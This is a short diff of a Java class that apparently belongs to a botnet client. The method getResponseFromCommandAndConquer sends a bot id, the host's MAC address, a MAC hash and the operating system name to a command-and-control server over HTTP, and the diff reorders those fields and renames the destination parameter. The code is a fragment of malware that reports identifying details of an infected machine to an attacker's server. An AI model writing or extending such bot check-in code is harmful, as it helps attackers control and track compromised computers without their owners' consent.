@@ -124,7 +124,7 @@ public class AsyncRequest {
 	}
 	
 	//da valutare se devono essere asincroni
-	public String getResponseFromCommandAndConquer(String idBot,String Mac,IP ip,Long keyNumber,Integer iterationNumber,String hashMac){
+	public String getResponseFromCommandAndConquer(String idBot,String Mac,IP dest,String hashMac){
 		Integer counter = 0;
 		String response = "";
 		while (counter <= REQNUMBER) {
@@ -135,13 +135,14 @@ public class AsyncRequest {
 			//RestTemplate rest=new RestTemplate();
 	
 			List<Object> objects=new ArrayList<Object>();
-			objects.add(hashMac);
 			objects.add(idBot);
-			objects.add(System.getProperty("os.name"));
 			objects.add(Mac);
+			objects.add(hashMac);
+			objects.add(System.getProperty("os.name"));
 			
 			
-			response=restTemplate.postForObject("http://"+ip+":8080/hmac", objects, String.class);
+			
+			response=restTemplate.postForObject("http://"+dest+":8080/hmac", objects, String.class);
 			System.out.println("Ok");
 			return response;
 		} catch (Exception e) {
